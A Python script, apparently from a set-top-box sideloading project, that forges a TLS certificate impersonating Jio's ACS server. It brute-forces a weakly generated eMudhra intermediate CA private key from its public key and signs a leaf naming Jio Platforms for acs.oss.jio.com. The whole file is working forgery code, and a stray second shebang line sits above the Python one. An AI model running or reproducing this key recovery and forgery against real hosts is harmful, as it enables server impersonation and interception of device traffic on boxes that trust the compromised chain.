#!/usr/bin/env bash
#!/usr/bin/env python3
"""
forge_emudhra_chain.py — Mint a forged ACS certificate for Jio STB.

Ported from ilikechocopies/sideload-jiostb (by Pavit Chhabra & research team).

WHY
    Jio's real ACS cert chains to their private sub-CA (RILSUBCA01 -> RILROOTCA),
    which we cannot forge. JHS-series boxes validate the chain against the system
    trust store and do NOT pin RILROOTCA, so any chain anchored on a root the box
    already trusts is accepted.

    In October 2026 eight eMudhra intermediate CA private keys were disclosed. They
    were weakly generated (P-384 scalars of 4, 56, 66, 115, 155, 156, 230, 237),
    so anyone can recompute them from the public certificate. One of those
    intermediates is cross-signed by Sectigo's "AAA Certificate Services" root,
    which is present in frozen pre-2021 trust stores -- exactly what an embedded
    box with a 2024 system image has.

WHAT IT DOES
    1. Fetches the compromised intermediate (or reads a local copy).
    2. Recovers the scalar d in 1..255 against its P-384 public key.
    3. Signs a leaf for --host with that key.
    4. Writes one PEM file: leaf + intermediate + leaf private key for pass_front.py.
"""

import argparse
import datetime
import socket
import ssl
import sys
from pathlib import Path

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
except ImportError:
    sys.exit("This script requires the 'cryptography' package (available in nix develop).")

TEST_HOST = "dv-g3b-aaa-emudhra.we-have-a-problem.com"
TEST_PORT = 443
EXPECTED_D = 156


def _aware(value):
    return value if value.tzinfo else value.replace(tzinfo=datetime.timezone.utc)


def not_before(cert):
    val = getattr(cert, "not_valid_before_utc", None) or cert.not_valid_before
    return _aware(val)


def not_after(cert):
    val = getattr(cert, "not_valid_after_utc", None) or cert.not_valid_after
    return _aware(val)


def fetch_intermediate_openssl():
    import re
    import subprocess

    cmd = [
        "openssl", "s_client",
        "-connect", f"{TEST_HOST}:{TEST_PORT}",
        "-servername", TEST_HOST,
        "-showcerts",
    ]
    try:
        out = subprocess.run(
            cmd, input="", capture_output=True, text=True, timeout=60, check=False
        ).stdout
    except FileNotFoundError:
        sys.exit(
            "openssl was not found. Save the intermediate manually or provide via --int-pem."
        )
    certs = re.findall(r"-----BEGIN CERTIFICATE-----\n.*?-----END CERTIFICATE-----", out, re.S)
    if len(certs) < 2:
        sys.exit(f"Could not extract intermediate cert from {TEST_HOST}")
    return x509.load_pem_x509_certificate(certs[1].encode())


def fetch_intermediate():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with ctx.wrap_socket(
            socket.create_connection((TEST_HOST, TEST_PORT), timeout=20), server_hostname=TEST_HOST
        ) as s:
            try:
                chain = s.get_verified_chain()
            except (AttributeError, ssl.SSLError):
                return fetch_intermediate_openssl()
            if not chain or len(chain) < 2:
                return fetch_intermediate_openssl()
            return x509.load_der_x509_certificate(chain[1])
    except Exception:
        return fetch_intermediate_openssl()


def recover_scalar(pubkey):
    expected_numbers = pubkey.public_numbers()
    curve = ec.SECP384R1()
    for d in range(1, 256):
        priv = ec.derive_private_key(d, curve)
        if priv.public_key().public_numbers() == expected_numbers:
            return d
    return None


def mint_leaf(int_cert, int_key, host, not_before, not_after):
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    leaf = (
        x509.CertificateBuilder()
        .subject_name(
            x509.Name(
                [
                    x509.NameAttribute(NameOID.COUNTRY_NAME, "IN"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Jio Platforms Ltd"),
                    x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "RJIL"),
                    x509.NameAttribute(NameOID.COMMON_NAME, host),
                ]
            )
        )
        .issuer_name(int_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(not_before)
        .not_valid_after(not_after)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False
        )
        .sign(int_key, hashes.SHA384())
    )
    return leaf, leaf_key


def main():
    ap = argparse.ArgumentParser(description="Forge an ACS cert signed by the weak eMudhra key")
    ap.add_argument("--host", default="acs.oss.jio.com")
    ap.add_argument("--out", default="certs/forged_chain.pem")
    ap.add_argument("--int-pem", default=None, help="local PEM of the compromised intermediate")
    ap.add_argument("--start", default=None, help="YYYY-MM-DD (default: int notBefore + 1d)")
    ap.add_argument("--end", default=None, help="YYYY-MM-DD (default: int notAfter - 1d)")
    args = ap.parse_args()

    repo_root = Path(__file__).resolve().parent.parent
    out_path = Path(args.out)
    if not out_path.is_absolute():
        out_path = repo_root / out_path

    if args.int_pem:
        int_cert = x509.load_pem_x509_certificate(open(args.int_pem, "rb").read())
    else:
        # Check if we already have intermediate cert locally
        local_chain = repo_root / "certs" / "acs_chain.pem"
        if local_chain.exists():
            int_cert = x509.load_pem_x509_certificate(open(local_chain, "rb").read())
        else:
            print(f"[*] Fetching intermediate from {TEST_HOST}:{TEST_PORT} ...")
            int_cert = fetch_intermediate()

    int_nb = not_before(int_cert)
    int_na = not_after(int_cert)
    print(f"[*] Intermediate : {int_cert.subject.rfc4514_string()}")
    print(f"[*] Validity     : {int_nb} -> {int_na}")

    d = recover_scalar(int_cert.public_key())
    if d is None:
        sys.exit("[!] Scalar not found in 1..255")
    print(f"[+] RECOVERED private key scalar: d = {d}")
    if d == EXPECTED_D:
        print(f"[+] Matches published value for EM DV TLS CA - G3B ({EXPECTED_D})")
    int_key = ec.derive_private_key(d, ec.SECP384R1())

    def parse_date(s, default):
        if not s:
            return default
        return datetime.datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=datetime.timezone.utc)

    nb = parse_date(args.start, int_nb + datetime.timedelta(days=1))
    na = parse_date(args.end, int_na - datetime.timedelta(days=1))
    if not (int_nb < nb < na < int_na):
        sys.exit("[!] Leaf validity window is outside intermediate's validity")

    leaf, leaf_key = mint_leaf(int_cert, int_key, args.host, nb, na)

    # Verify signature
    verifier = int_cert.public_key()
    verifier.verify(leaf.signature, leaf.tbs_certificate_bytes, ec.ECDSA(hashes.SHA384()))

    lp = leaf.public_bytes(serialization.Encoding.PEM).decode()
    ip = int_cert.public_bytes(serialization.Encoding.PEM).decode()
    kp = leaf_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ).decode()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "w") as f:
        f.write(lp + ip + kp)

    print(f"[+] Leaf CN={args.host} valid {nb} -> {na}")
    print(f"[+] Chain successfully written to: {out_path}")


if __name__ == "__main__":
    main()
